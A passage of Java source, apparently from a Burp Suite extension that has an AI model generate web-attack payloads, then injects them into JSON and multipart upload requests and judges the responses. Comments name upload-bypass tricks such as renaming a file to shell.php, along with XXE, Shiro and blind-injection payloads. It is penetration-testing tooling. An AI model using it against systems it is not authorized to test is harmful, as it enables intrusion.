                jsonBody = this.gson.fromJson(body, JsonObject.class);
            }
            catch (Exception e) {
                this.logPanel.logWarning(Msg.t("log.json.parseFailed", position));
                return null;
            }
            if (jsonBody == null) {
                this.logPanel.logWarning(Msg.t("log.json.notObject", position));
                return null;
            }
            List<JsonPathSegment> segments = parseJsonPath(position);
            if (segments.isEmpty()) return null;
            JsonElement existing = jsonPathGet(jsonBody, segments);
            JsonObject payloadJson = this.tryParseJsonObject(payload);
            if (existing == null) {
                // 路径不存在：仅当载荷本身是 {"参数名": 值} 形态时才按顶层键合并
                if (payloadJson != null && payloadJson.has(position)) {
                    jsonBody.add(position, payloadJson.get(position));
                    return this.buildRequestWithBody(originalRequest, bodyOffset, jsonBody.toString());
                }
                this.logPanel.logWarning(Msg.t("log.json.pathMissing", position));
                return null;
            }
            JsonElement newValue;
            if (payloadJson != null && existing.isJsonObject()) {
                // 载荷是 JSON 对象且目标是对象：按键合并，保留其余键（不再整值覆盖）
                JsonObject merged = existing.getAsJsonObject().deepCopy();
                for (String key : payloadJson.keySet()) {
                    merged.add(key, payloadJson.get(key));
                }
                newValue = merged;
            } else if (payloadJson != null && payloadJson.has(position)) {
                newValue = payloadJson.get(position);
            } else {
                newValue = new JsonPrimitive(payload);
            }
            if (!jsonPathSet(jsonBody, segments, newValue)) {
                this.logPanel.logWarning(Msg.t("log.json.writeBackFailed", position));
                return null;
            }
            return this.buildRequestWithBody(originalRequest, bodyOffset, jsonBody.toString());
        }
        catch (Exception e) {
            this.logPanel.logError(Msg.t("log.json.exception"), e);
            return null;
        }
    }

    private byte[] modifyMultipartRequest(byte[] originalRequest, String payload, String position, IRequestInfo requestInfo, String contentType) {
        try {
            String boundary = this.extractBoundary(contentType);
            if (boundary == null) {
                this.logPanel.logWarning(Msg.t("log.mp.noBoundary", position));
                return null;
            }
            int bodyOffset = requestInfo.getBodyOffset();
            if (bodyOffset < 0 || bodyOffset > originalRequest.length) return null;

            // 整段替换走字节路径：不解析 part 内部结构、不解码整个 body，
            // 所以同一请求里的二进制 part（上传的图片、压缩包）不会被 UTF-8 往返破坏。
            // 这是文件上传类载荷的主路径。
            if (payload.contains("Content-Disposition:")) {
                byte[] spliced = this.replaceMultipartPartBytes(originalRequest, bodyOffset, boundary, payload, position);
                if (spliced == null) {
                    this.logPanel.logWarning(Msg.t("log.mp.noReplaceableField", position));
                }
                return spliced;
            }

            // 精细修改（只改 filename / Content-Type / 文件内容）分两条路：
            //  - 文本 body 先走老的整段解码路径（行为不变）；
            //  - 二进制 body、或文本路径没改到东西时，走下面的字节级改写。
            byte[] rawBody = Arrays.copyOfRange(originalRequest, bodyOffset, originalRequest.length);
            String body = new String(rawBody, StandardCharsets.UTF_8);
            boolean textBody = Arrays.equals(body.getBytes(StandardCharsets.UTF_8), rawBody);
            if (textBody) {
                String modifiedBody = this.modifyMultipartParts(body, payload, position, boundary);
                if (modifiedBody != null && !modifiedBody.equals(body)) {
                    return this.buildRequestWithBody(originalRequest, bodyOffset, modifiedBody);
                }
            }
            byte[] rewritten = this.rewriteMultipartPartBytes(originalRequest, bodyOffset, boundary, payload, position);
            if (rewritten != null) {
                return rewritten;
            }
            if (textBody) {
                this.logPanel.logWarning(Msg.t("log.mp.noInjectableField", position));
            } else {
                this.logPanel.logWarning(Msg.t("log.send.multipartBinary", position));
            }
            return null;
        }
        catch (Exception e) {
            this.logPanel.logError(Msg.t("log.mp.exception"), e);
            return null;
        }
    }

    /**
     * 字节级「整段替换」：把目标 part 的整个字节区间换成载荷的字节。
     *
     * <p>只做「找分隔符 → 拼区间」，既不解析 part 内部结构，也不解码整个 body，
     * 因此同一请求里的二进制 part 不会被破坏 —— 不是靠防护，而是结构上就没碰那些字节。
     * （替换单位是整个 part 而非 part 内的某个字段，这一点参考了 Upload_Auto_Fuzz
     * 的做法：它在 Burp Intruder 里让用户框选「从 Content-Disposition 到文件内容结束」整段。）
     *
     * <p>目标 part 的选择：先按 position 匹配 part 名，匹配不上再退到第一个含 filename 的 part。
     */
    private byte[] replaceMultipartPartBytes(byte[] request, int bodyOffset, String boundary, String payload, String position) {
        byte[] delimiter = ("--" + boundary).getBytes(StandardCharsets.UTF_8);
        List<Integer> marks = this.multipartMarks(request, bodyOffset, boundary);
        if (marks == null) return null;

        String trimmedPayload = trimTrailingNewlines(payload);
        byte[] payloadBytes = ("\r\n" + trimmedPayload + "\r\n").getBytes(StandardCharsets.UTF_8);

        int targetIndex = -1;
        if (position != null && !position.isEmpty()) {
            for (int i = 0; i + 1 < marks.size(); ++i) {
                if (this.partNameMatches(request, marks.get(i) + delimiter.length, marks.get(i + 1), position)) {
                    targetIndex = i;
                    break;
                }
            }
        }
        if (targetIndex < 0) {
            for (int i = 0; i + 1 < marks.size(); ++i) {
                if (this.partHasFilename(request, marks.get(i) + delimiter.length, marks.get(i + 1))) {
                    targetIndex = i;
                    break;
                }
            }
        }
        if (targetIndex < 0) return null;

        int partStart = marks.get(targetIndex) + delimiter.length;
        int partEnd = marks.get(targetIndex + 1);
        int newBodyLength = (partStart - bodyOffset) + payloadBytes.length + (request.length - partEnd);
        byte[] spliced = new byte[request.length - (partEnd - partStart) + payloadBytes.length];
        System.arraycopy(request, 0, spliced, 0, partStart);
        System.arraycopy(payloadBytes, 0, spliced, partStart, payloadBytes.length);
        System.arraycopy(request, partEnd, spliced, partStart + payloadBytes.length, request.length - partEnd);
        return this.updateContentLength(spliced, newBodyLength);
    }

    /**
     * 找出 body 里每个 {@code --boundary} 分隔符的起始偏移。返回 null 表示这不是一个能解析的
     * multipart body（分隔符少于两个）。两条字节级路径共用它 —— 边界扫描只该有一份实现。
     */
    private List<Integer> multipartMarks(byte[] request, int bodyOffset, String boundary) {
        byte[] delimiter = ("--" + boundary).getBytes(StandardCharsets.UTF_8);
        List<Integer> marks = new ArrayList<Integer>();
        int cursor = bodyOffset;
        while (cursor < request.length) {
            int hit = indexOfBytes(request, delimiter, cursor, request.length);
            if (hit < 0) break;
            marks.add(hit);
            cursor = hit + delimiter.length;
        }
        return marks.size() < 2 ? null : marks;
    }

    /**
     * 字节级「按字段改写」：只重写 part 头里的 {@code filename=} / {@code Content-Type:}，
     * 以及 part 的正文区间。
     *
     * <p><b>为什么必须有它</b>：文本路径（{@link #modifyMultipartParts}）要先解码整个 body，
     * 所以对含二进制的 body 一律拒绝 —— 而真实文件上传的 body 里躺着的就是那张图片/压缩包的原始
     * 字节，于是**最该测的那类请求反而永远走不到文件上传的注入**，还会继续往下落到通用的参数替换，
     * 把 part 头整个写坏（见 {@link #modifyParameter} 里那段说明）。
     * 这里不解码正文：part 头一定是 ASCII，可以安全解码；正文只按算出来的字节区间搬运，
     * 同一请求里的原文件一个字节都不动。
     *
     * <p>语义与 {@link #tryModifyMultipartPart} 对齐（复用同一批载荷解析方法），否则两条路径
     * 对同一条载荷会给出不同结果：载荷带 {@code filename=} 就换文件名；空行之后有正文就换正文；
     * 只声明 part 头（空行之后没有内容）就**保留原正文** —— 这正是「后缀改成 .php、内容还是原图」
     * 那种最有说服力的形态；{@code position=filename} 时载荷本身就是文件名。
     *
     * <p>目标 part 的选法与整段替换一致：先按 part 名匹配，未命中再退到第一个含 {@code filename=}
     * 的 part。
     *
     * @return 改写后的请求；没有可改之处返回 null
     */
    private byte[] rewriteMultipartPartBytes(byte[] request, int bodyOffset, String boundary,
                                             String payload, String position) {
        try {
            List<Integer> marks = this.multipartMarks(request, bodyOffset, boundary);
            if (marks == null) return null;
            int delimiterLength = ("--" + boundary).length();

            // 目标 part 的选法与文本路径（tryModifyMultipartPart）**逐条对齐** —— 同一条载荷不能
            // 因为 body 恰好是二进制就换个答案。特别地这里**没有**「匹配不上就退到第一个文件部件」
            // 那种兜底：那是静默改靶 —— 为别的参数生成的载荷
            // 会被打进文件部件，结果是个谁也证明不了的请求。（整段替换形态仍保留该兜底，
            // 因为那种载荷本身就是一整个 part，含义明确。）
            int targetIndex = -1;
            for (int i = 0; i + 1 < marks.size(); ++i) {
                String header = partHeaderText(request, marks.get(i) + delimiterLength, marks.get(i + 1));
                if (!header.contains("Content-Disposition:")) continue;
                boolean positionMatches = position != null
                        && position.equalsIgnoreCase(this.extractMultipartName(header));
                boolean filenamePosition = position != null && position.equalsIgnoreCase("filename")
                        && header.contains("filename=");
                boolean noPosition = position == null || position.isEmpty();
                if (!positionMatches && !filenamePosition && !(noPosition && header.contains("filename="))) {
                    continue;
                }
                targetIndex = i;
                break;
            }
            if (targetIndex < 0) return null;

            byte[] crlfcrlf = "\r\n\r\n".getBytes(StandardCharsets.UTF_8);
            int partStart = marks.get(targetIndex) + delimiterLength;
            int partEnd = marks.get(targetIndex + 1);
            int headerEnd = indexOfBytes(request, crlfcrlf, partStart, partEnd);
            if (headerEnd < 0) return null;
            String header = new String(request, partStart, headerEnd - partStart, StandardCharsets.UTF_8);
            if (!header.contains("Content-Disposition:")) return null;

            boolean filenamePosition = position != null && position.equalsIgnoreCase("filename")
                    && header.contains("filename=");
            boolean carriesPartHeader = payload.contains("filename=") || payload.contains("Content-Type:");

            String newHeader = header;
            if (filenamePosition && !payload.contains("filename=")) {
                String bare = payload.trim();
                if (!bare.isEmpty() && bare.indexOf('\r') < 0 && bare.indexOf('\n') < 0) {
                    newHeader = this.replaceFilename(newHeader, bare);
                }
            }
            if (newHeader.contains("filename=") && payload.contains("filename=")) {
                String newFilename = this.extractFilename(payload);
                if (newFilename != null) {
                    newHeader = this.replaceFilename(newHeader, newFilename);
                }
            }
            if (newHeader.contains("Content-Type:") && payload.contains("Content-Type:")) {
                String newContentType = this.extractContentTypeFromPayload(payload);
                if (newContentType != null) {
                    newHeader = this.replaceContentType(newHeader, newContentType);
                }
            }

            byte[] newContent = null;
            String content = filenamePosition && !carriesPartHeader
                    ? null                                        // 载荷就是文件名本身，没有正文
                    : (carriesPartHeader ? contentAfterBlankLine(payload) : this.extractFileContent(payload));
            if (content != null && !content.isEmpty()) {
                newContent = content.getBytes(StandardCharsets.UTF_8);
            }
            if (newHeader.equals(header) && newContent == null) {
                return null;                                      // 一点都没改到
            }

            // 正文区间是 [headerEnd+4, partEnd)，末尾那个 CRLF 属于分隔符的一部分 ——
            // 换正文时要自己补回去，否则会拼出「正文紧贴 --boundary」的坏 body
            byte[] headerBytes = newHeader.getBytes(StandardCharsets.UTF_8);
            int contentStart = headerEnd + 4;
            int contentLength = newContent != null ? newContent.length + 2 : (partEnd - contentStart);
            byte[] out = new byte[partStart + headerBytes.length + 4 + contentLength + (request.length - partEnd)];
            int at = 0;
            System.arraycopy(request, 0, out, at, partStart);
            at += partStart;
            System.arraycopy(headerBytes, 0, out, at, headerBytes.length);
            at += headerBytes.length;
            System.arraycopy(crlfcrlf, 0, out, at, 4);
            at += 4;
            if (newContent != null) {
                System.arraycopy(newContent, 0, out, at, newContent.length);
                at += newContent.length;
                byte[] crlf = "\r\n".getBytes(StandardCharsets.UTF_8);
                System.arraycopy(crlf, 0, out, at, crlf.length);
                at += crlf.length;
            } else {
                System.arraycopy(request, contentStart, out, at, partEnd - contentStart);
                at += partEnd - contentStart;
            }
            // 尾部（partEnd 之后：后续 part 与结束用的 --boundary--）必须原样接回去，
            // 漏掉它请求就少了结束分隔符 —— 服务端会一直等下一个 part
            System.arraycopy(request, partEnd, out, at, request.length - partEnd);
            return this.updateContentLength(out, out.length - bodyOffset);
        }
        catch (Exception e) {
            this.logPanel.logError(Msg.t("log.mp.rewriteException"), e);
            return null;
        }
    }

    private static int indexOfBytes(byte[] haystack, byte[] needle, int from, int to) {
        if (needle.length == 0) return -1;
        for (int i = from; i + needle.length <= to; ++i) {
            boolean hit = true;
            for (int j = 0; j < needle.length; ++j) {
                if (haystack[i + j] != needle[j]) {
                    hit = false;
                    break;
                }
            }
            if (hit) return i;
        }
        return -1;
    }

    /** 取 part 头部（到空行为止）的文本：part 头一定是 ASCII，解码不会碰到二进制内容 */
    private static String partHeaderText(byte[] request, int partStart, int partEnd) {
        byte[] separator = "\r\n\r\n".getBytes(StandardCharsets.UTF_8);
        int headerEnd = indexOfBytes(request, separator, partStart, partEnd);
        int end = headerEnd < 0 ? partEnd : headerEnd;
        return new String(request, partStart, end - partStart, StandardCharsets.UTF_8);
    }

    private boolean partNameMatches(byte[] request, int partStart, int partEnd, String position) {
        String name = this.extractMultipartName(partHeaderText(request, partStart, partEnd));
        return name != null && !name.isEmpty() && name.equalsIgnoreCase(position);
    }

    private boolean partHasFilename(byte[] request, int partStart, int partEnd) {
        return partHeaderText(request, partStart, partEnd).contains("filename=");
    }

    private static String trimTrailingNewlines(String text) {
        int end = text.length();
        while (end > 0 && (text.charAt(end - 1) == '\n' || text.charAt(end - 1) == '\r')) {
            --end;
        }
        return text.substring(0, end);
    }


    /**
     * 修正 Content-Length。只在 header 区内查找（避免改到 body 里的同名字符串）、
     * 大小写不敏感，缺失时补一行。
     */
    private byte[] updateContentLength(byte[] request, int newContentLength) {
        try {
            int bodyOffset = this.helpers.analyzeRequest(request).getBodyOffset();
            if (bodyOffset <= 0 || bodyOffset > request.length) {
                return request;
            }
            // 只解码 header 区；body 保持原始字节 —— 文件上传的二进制 body 经不起 UTF-8 往返
            String headerStr = new String(request, 0, bodyOffset, StandardCharsets.UTF_8);
            java.util.regex.Matcher matcher = java.util.regex.Pattern
                    .compile("(?im)^(content-length[ \\t]*:[ \\t]*)\\d+[ \\t]*$")
                    .matcher(headerStr);
            if (matcher.find()) {
                headerStr = matcher.replaceFirst("$1" + newContentLength);
            } else if (headerStr.endsWith("\r\n\r\n")) {
                // 只留末尾空行的那**一个** CRLF：切 2 个字符而不是 4 个。
                // 切 4 个会把上一行请求头自己的终结符也切掉，新头就被粘在它后面
                //（Content-Type: application/xmlContent-Length: 25）—— Content-Length 头于是
                // 根本不存在、上一个头的值也被污染，而载荷确实在字节里，注入层的自检抓不到。
                headerStr = headerStr.substring(0, headerStr.length() - 2)
                        + "Content-Length: " + newContentLength + "\r\n\r\n";
            } else if (headerStr.endsWith("\n\n")) {
                headerStr = headerStr.substring(0, headerStr.length() - 1)
                        + "Content-Length: " + newContentLength + "\n\n";
            } else {
                return request;
            }
            byte[] newHeaderBytes = headerStr.getBytes(StandardCharsets.UTF_8);
            byte[] result = new byte[newHeaderBytes.length + (request.length - bodyOffset)];
            System.arraycopy(newHeaderBytes, 0, result, 0, newHeaderBytes.length);
            System.arraycopy(request, bodyOffset, result, newHeaderBytes.length, request.length - bodyOffset);
            return result;
        }
        catch (Exception e) {
            return request;
        }
    }

    private String extractBoundary(String contentType) {
        int boundaryIndex = contentType.toLowerCase().indexOf("boundary=");
        if (boundaryIndex == -1) {
            return null;
        }
        String boundary = contentType.substring(boundaryIndex + 9).trim();
        int semicolonIndex = (boundary = boundary.replace("\"", "").replace("'", "")).indexOf(";");
        if (semicolonIndex != -1) {
            boundary = boundary.substring(0, semicolonIndex);
        }
        return boundary;
    }

    /**
     * 逐 part 原地重建。不再用 String.split —— boundary 里的 . + $ ( 等字符会被当成正则，
     * 轻则切分错误、重则抛 PatternSyntaxException 被静默吞掉。
     * 返回 null 表示没有任何 part 被修改。
     */
    private String modifyMultipartParts(String body, String payload, String position, String boundary) {
        try {
            String delimiter = "--" + boundary;
            StringBuilder out = new StringBuilder();
            int pos = 0;
            boolean modified = false;
            while (pos < body.length()) {
                int delimStart = body.indexOf(delimiter, pos);
                if (delimStart < 0) {
                    out.append(body, pos, body.length());
                    break;
                }
                if (delimStart > pos) {
                    out.append(body, pos, delimStart);
                }
                int partStart = delimStart + delimiter.length();
                int nextDelim = body.indexOf(delimiter, partStart);
                if (nextDelim < 0) {
                    out.append(delimiter).append(body, partStart, body.length());
                    break;
                }
                String part = body.substring(partStart, nextDelim);
                String newPart = this.tryModifyMultipartPart(part, payload, position);
                if (newPart != null) {
                    out.append(delimiter).append(newPart);
                    modified = true;
                } else {
                    out.append(delimiter).append(part);
                }
                pos = nextDelim;
            }
            return modified ? out.toString() : body;
        }
        catch (Exception e) {
            this.logPanel.logError(Msg.t("log.mp.partsException"), e);
            return null;
        }
    }

    /** 尝试修改单个 multipart part；没有可改之处返回 null（调用方据此判断是否改动过） */
    private String tryModifyMultipartPart(String part, String payload, String position) {
        if (!part.contains("Content-Disposition:")) return null;
        String name = this.extractMultipartName(part);
        boolean positionMatches = position != null && position.equalsIgnoreCase(name);
        // position=filename：Burp 会把 multipart 的 filename 属性也当成参数报出来，模型照着写很自然。
        // 这时载荷是「文件名本身」，直接换掉 filename，不要当成 part 内容写进去。
        boolean filenamePosition = position != null && position.equalsIgnoreCase("filename")
                && part.contains("filename=");
        if (position != null && !position.isEmpty() && !positionMatches && !filenamePosition) {
            return null;
        }
        boolean carriesPartHeader = payload.contains("filename=") || payload.contains("Content-Type:");
        String newPart = part;
        boolean changed = false;
        if (filenamePosition && !payload.contains("filename=")) {
            String bare = payload.trim();
            if (!bare.isEmpty() && !bare.contains("\r\n") && !bare.contains("\n")) {
                newPart = this.replaceFilename(newPart, bare);
                changed = true;
            }
        }
        if (newPart.contains("filename=") && payload.contains("filename=")) {
            String newFilename = this.extractFilename(payload);
            if (newFilename != null) {
                newPart = this.replaceFilename(newPart, newFilename);
                changed = true;
            }
        }
        if (newPart.contains("Content-Type:") && payload.contains("Content-Type:")) {
            String newContentType = this.extractContentTypeFromPayload(payload);
            if (newContentType != null) {
                newPart = this.replaceContentType(newPart, newContentType);
                changed = true;
            }
        }
        if (positionMatches || filenamePosition || "file".equalsIgnoreCase(name) || "upload".equalsIgnoreCase(name)) {
            // 载荷只声明了 filename= / Content-Type:（空行之后没有正文）时，**不能**把这段声明
            // 当成文件内容写进去 —— 那样得到的是一个内容为 filename="shell.php" 的文件，
            // 后缀改对了、内容却是垃圾，除了路径泄露什么都证明不了
            String newContent;
            if (filenamePosition && !carriesPartHeader) {
                newContent = null;                       // 载荷就是文件名本身，没有正文
            } else if (carriesPartHeader) {
                newContent = contentAfterBlankLine(payload);
            } else {
                newContent = this.extractFileContent(payload);
            }
            if (newContent != null && !newContent.isEmpty()) {
                String replaced = this.replacePartContent(newPart, newContent);
                if (!replaced.equals(newPart)) {
                    newPart = replaced;
                    changed = true;
                }
            }
        }
        return changed ? newPart : null;
    }

    /** 载荷里「空行之后」的正文（part 头声明形态）；没有空行就返回 null（表示只改了 part 头） */
    private static String contentAfterBlankLine(String payload) {
        int at = payload.indexOf("\r\n\r\n");
        int skip = 4;
        if (at == -1) {
            at = payload.indexOf("\n\n");
            skip = 2;
        }
        if (at == -1) return null;
        String content = payload.substring(at + skip).trim();
        if (content.endsWith("--")) {
            content = content.substring(0, content.length() - 2).trim();
        }
        return content.isEmpty() ? null : content;
    }

    private String extractMultipartName(String part) {
        int nameIndex = part.indexOf("name=\"");
        if (nameIndex == -1) {
            return "";
        }
        int endIndex = part.indexOf("\"", nameIndex + 6);
        if (endIndex == -1) {
            return "";
        }
        return part.substring(nameIndex + 6, endIndex);
    }

    private String extractFilename(String payload) {
        int filenameIndex = payload.indexOf("filename=\"");
        if (filenameIndex == -1) {
            return null;
        }
        int endIndex = payload.indexOf("\"", filenameIndex + 10);
        if (endIndex == -1) {
            return null;
        }
        return payload.substring(filenameIndex + 10, endIndex);
    }

    private String replaceFilename(String part, String newFilename) {
        int filenameIndex = part.indexOf("filename=\"");
        if (filenameIndex == -1) {
            return part;
        }
        int endIndex = part.indexOf("\"", filenameIndex + 10);
        if (endIndex == -1) {
            return part;
        }
        return part.substring(0, filenameIndex + 10) + newFilename + part.substring(endIndex);
    }

    private String extractContentTypeFromPayload(String payload) {
        int ctIndex = payload.indexOf("Content-Type:");
        if (ctIndex == -1) {
            return null;
        }
        int endIndex = payload.indexOf("\n", ctIndex);
        if (endIndex == -1) {
            return null;
        }
        return payload.substring(ctIndex + 13, endIndex).trim();
    }

    private String replaceContentType(String part, String newContentType) {
        int ctIndex = part.indexOf("Content-Type:");
        if (ctIndex == -1) {
            return part;
        }
        int endIndex = part.indexOf("\n", ctIndex);
        if (endIndex == -1) {
            return part;
        }
        // 保留原行的 \r —— 吃掉它会让 part 的 header/内容分隔符由 \r\n\r\n 退化成 \n\r\n，
        // 于是内容替换找不到分隔符而静默失效
        int lineEnd = endIndex;
        if (lineEnd > ctIndex && part.charAt(lineEnd - 1) == '\r') {
            lineEnd--;
        }
        return part.substring(0, ctIndex + 13) + " " + newContentType + part.substring(lineEnd);
    }

    private String extractFileContent(String payload) {
        if (payload.contains("Content-Disposition:")) {
            // part 头与内容之间的空行：CRLF 载荷是 \r\n\r\n，只找 \n\n 必然失配，
            // 失配后整个载荷会被当成文件内容写进 part，请求体就坏了
            int contentStart = payload.indexOf("\r\n\r\n");
            int skip = 4;
            if (contentStart == -1) {
                contentStart = payload.indexOf("\n\n");
                skip = 2;
            }
            if (contentStart == -1) {
                contentStart = payload.indexOf("...\n");
                skip = 4;
            }
            if (contentStart != -1) {
                int contentEnd = payload.lastIndexOf("--");
                if (contentEnd <= contentStart) {
                    contentEnd = payload.length();
                }
                return payload.substring(contentStart + skip, contentEnd).trim();
            }
        }
        return payload;
    }

    private String replacePartContent(String part, String newContent) {
        // 与 extractFileContent 同理：CRLF 的 part 只找 \n\n 必然失配，
        // 结果是 multipart 字段注入对 CRLF 请求体从来没生效过（返回原 part）
        int contentStart = part.indexOf("\r\n\r\n");
        int skip = 4;
        if (contentStart == -1) {
            contentStart = part.indexOf("\n\n");
            skip = 2;
        }
        if (contentStart == -1) {
            contentStart = part.indexOf("...\n");
            skip = 4;
        }
        if (contentStart == -1) {
            return part;
        }
        String header = part.substring(0, contentStart + skip);
        return header + newContent + "\r\n";
    }

    /** 日志里载荷文本的显示上限：超出只留前 200 字符（并在末尾注明原文长度） */
    private static final int LOG_PAYLOAD_LIMIT = 200;

    /**
     * 日志里的载荷文本：把换行转义成字面 \n、超长截断。
     * multipart 整段 part（自带 CRLF）与 XXE 多行载荷会把一条日志撑成好几行，
     * 破坏「一条载荷一行」的节奏；Shiro 展开后的 base64 也有 350+ 字符，一条就占满一行。
     */
    static String loggablePayload(String payload) {
        if (payload == null) return "";
        String text = payload.replace("\r\n", "\\n").replace("\n", "\\n").replace("\r", "\\n").replace("\t", " ");
        if (text.length() <= LOG_PAYLOAD_LIMIT) return text;
        return text.substring(0, LOG_PAYLOAD_LIMIT) + Msg.t("log.payloadTruncated", payload.length());
    }

    /** 「无变化即无漏洞」的耗时容差（毫秒）：时间盲注载荷的延迟是秒级，1 秒以内按无差异算 */
    private static final long NO_DIFF_TIMING_TOLERANCE_MILLIS = 1000L;

    /**
     * 比对响应时**不参与判断**的易变响应头（小写名字）。
     *
     * <p>为什么要剥：跳过规则与 {@link #evidenceAnchor} 比的都是 Burp 给的**整段响应**
     * （状态行 + 全部响应头 + 响应体），而 {@code Date:} 的粒度是 1 秒 —— 步骤1 到步骤4 之间隔着
     * 两次大模型往返（秒级到分钟级），所以**只要目标发 Date 头，两个响应就永远「不相等」**。
     * 实测有两个后果：
     * <ul>
     *   <li>「与基线无差异即无漏洞、跳过 AI 验证」这条规则**形同虚设**（收尾摘要里的
     *       {@code 无差异跳过验证 K} 恒为 0），每条载荷都白花一次调用；</li>
     *   <li>{@link #evidenceAnchor} 在载荷没被回显时退化成「与基线的首个不同处」——
     *       那就是 Date 头所在的位置（第 40 来个字符），于是盲注类载荷的窗口全锚在页面头部，
     *       而提示词里还写着「关键位置在第 N 字符处」。</li>
     * </ul>
     *
     * <p>{@code ETag} / {@code Last-Modified} **不在此列**：它们只在内容真的变了时才变，是信号不是噪声。
     */
    private static final String[] VOLATILE_HEADER_NAMES = { "date" };

    /**
     * 把易变响应头的**值**替换成等长的 {@code '0'}，用于比对与取锚点（名单见
     * {@link #VOLATILE_HEADER_NAMES}）。
     *
     * <p>**长度必须逐字节保持不变**：{@link evidenceAnchor} 返回的是原文偏移、
     * {@link excerptForPrompt} 按原字符串切片 —— 掩码一旦改变长度，窗口就会整体错位。
     * 用 {@code '0'} 而不是删除或空格，也是为了这个（可打印、长度不变、不会把两行粘起来）。
     *
     * <p>只动**响应头区域**（首个空行之前），正文里出现 {@code Date:} 字样的内容一律不碰；
     * 也不修改入参（返回克隆）。
     */
    static byte[] volatileHeadersMasked(byte[] response) {
        if (response == null || response.length == 0) return response;
        byte[] out = response.clone();
        int pos = 0;
        while (pos < out.length) {
            int lineEnd = -1;
            for (int i = pos; i + 1 < out.length; i++) {
                if (out[i] == '\r' && out[i + 1] == '\n') {
                    lineEnd = i;
                    break;
                }
            }
            int end = lineEnd < 0 ? out.length : lineEnd;
            if (end == pos) break;                 // 空行 = 响应头结束，后面是正文
            int colon = -1;
            for (int i = pos; i < end; i++) {
                if (out[i] == ':') {
                    colon = i;
                    break;
                }
            }
            // colon > pos：状态行（HTTP/1.1 200 OK）没有冒号，跳过；以空格开头的续行也不会命中
            if (colon > pos) {
                String name = new String(out, pos, colon - pos, StandardCharsets.US_ASCII).trim().toLowerCase(Locale.ROOT);
                for (String volatileName : VOLATILE_HEADER_NAMES) {
                    if (!volatileName.equals(name)) continue;
                    for (int i = colon + 1; i < end; i++) {
                        if (out[i] != ' ' && out[i] != '\t') out[i] = '0';
                    }
                    break;
                }
            }
            if (lineEnd < 0) break;
            pos = lineEnd + 2;
        }
        return out;
    }

    /**
     * {@link #volatileHeadersMasked} 的文本形态：给 {@link #evidenceAnchor} 用（它比的是两个已解码
     * 的字符串）。只对**响应头值**做等长替换，而响应头是 ASCII，所以字符数不受影响、偏移仍然对得上原串。
     */
    static String volatileHeadersMaskedText(String text) {
        if (text == null) return null;
        return new String(volatileHeadersMasked(text.getBytes(StandardCharsets.UTF_8)), StandardCharsets.UTF_8);
    }

    /**
     * 本次测试是否**毫无可观测差异**：响应与基线逐字节相同、耗时差在容差内、且没有回连记录。
     *
     * <p>这类载荷的结论是确定的（验证提示词第一原则就是「与基线完全一致即表示没有漏洞」），
     * 不必再花一次 AI 调用。任何一项证据缺失就返回 false —— 宁可多调用，也不要漏判。
     *
     * @param hasOobRecords   已经查到本次请求的回连记录（这类必须交给 AI 判）
     * @param controlResponse 同组合对照（该组合第一条载荷）的响应；**null = 没有对照**，
     *                        此时行为与没有这个参数时逐字一致。见下面那段的用意
     */
    static boolean noObservableDifference(byte[] baseline, long baselineMillis, byte[] testResponse,
                                          long elapsedMs, boolean hasOobRecords, byte[] controlResponse) {
        if (hasOobRecords) return false;                       // 有回连记录：证据在，必须判
        if (baseline == null || testResponse == null) return false;   // 缺一侧无法比较，交给 AI
        // 比的是**剥掉易变响应头之后**的视图：不剥的话 Date 每次都不同，下面这行永远为假，
        // 整个跳过规则等于死代码（见 VOLATILE_HEADER_NAMES 的说明）
        if (!java.util.Arrays.equals(volatileHeadersMasked(baseline), volatileHeadersMasked(testResponse))) {
            return false;                                      // 响应有差异，交给 AI
        }
        if (baselineMillis < 0) return false;                  // 基线耗时未知，别自作主张
        if (!(Math.abs(elapsedMs - baselineMillis) < NO_DIFF_TIMING_TOLERANCE_MILLIS)) return false;
        // 与基线一致、却与**同组合对照**不同：同一个参数换个无害值行为就变了 ——
        // 这正是布尔盲注那类**成对**证据的形态，必须交给模型看，不能按「与基线一致即无漏洞」跳过。
        // 这里只会**少跳过**、不会多跳过：方向上是保守的，代价只是多花一次调用。
        if (controlResponse != null
                && !java.util.Arrays.equals(volatileHeadersMasked(controlResponse), volatileHeadersMasked(testResponse))) {
            return false;
        }
        return true;
    }

    /**
     * 解析 AI 返回的 JSON 对象：先直接解析，失败则尝试「补全被截断的 JSON」再解析一次。
     *
     * <p>为什么必须做：step2/step3 的返回体是整轮扫描里最大的（step3 要为每个组合给 9 条载荷），
     * 模型一旦写到 max_tokens 上限就会截断 —— 此前只有验证阶段会补全，step2/step3 解析失败
     * 直接返回 null，整个任务连包都不发（记成「分析失败」）。补全后至少能保住已经写完整的那几条载荷。
     */
    private JsonObject parseAiJson(String jsonStr) {
        if (jsonStr == null || jsonStr.trim().isEmpty()) return null;
        try {
            return this.gson.fromJson(jsonStr, JsonObject.class);
        } catch (Exception e) {
            String fixed = fixIncompleteJson(jsonStr);
            if (fixed != null && !fixed.equals(jsonStr)) {
                try {
                    JsonObject repaired = this.gson.fromJson(fixed, JsonObject.class);
                    if (repaired != null) {
                        this.logPanel.logWarning(Msg.t("log.ai.repairedJson"));
                        return repaired;
                    }
                } catch (Exception e2) {
                    // 补全也救不回来，按解析失败处理
                }
            }
            return null;
        }
    }

    private String fixIncompleteJson(String jsonStr) {
        try {
            if (jsonStr == null || jsonStr.trim().isEmpty()) {
                return null;
            }
            StringBuilder fixed = new StringBuilder(jsonStr);
            int braceCount = 0;
            int bracketCount = 0;
            boolean inString = false;
            boolean escaped = false;
            for (int i = 0; i < fixed.length(); ++i) {
                char c = fixed.charAt(i);
                if (escaped) {
                    escaped = false;
                    continue;
                }
                if (c == '\\') {
                    escaped = true;
                    continue;
                }
                if (c == '\"') {
                    inString = !inString;
                    continue;
                }
                if (inString) continue;
                if (c == '{') {
                    ++braceCount;
                    continue;
                }
                if (c == '}') {
                    --braceCount;
                    continue;
                }
                if (c == '[') {
                    ++bracketCount;
                    continue;
                }
                if (c != ']') continue;
                --bracketCount;
            }
            if (inString || bracketCount > 0 || braceCount > 0) {
                // 回退到「最后一个完整的条目边界」再补上闭合符：截断可能落在任何位置
                // （entry 中间、entry 之后、数组尾），所以从最后一个 } 往前逐个试，
                // 只要有一个前缀能解析成对象就用它 —— 保住已经写完整的那些条目。
                int at = jsonStr.length();
                for (int tries = 0; tries < 512; ++tries) {
                    int brace = jsonStr.lastIndexOf('}', at - 1);
                    if (brace <= 0) break;
                    String candidate = jsonStr.substring(0, brace + 1).stripTrailing();
                    if (candidate.endsWith(",")) {
                        candidate = candidate.substring(0, candidate.length() - 1).stripTrailing();
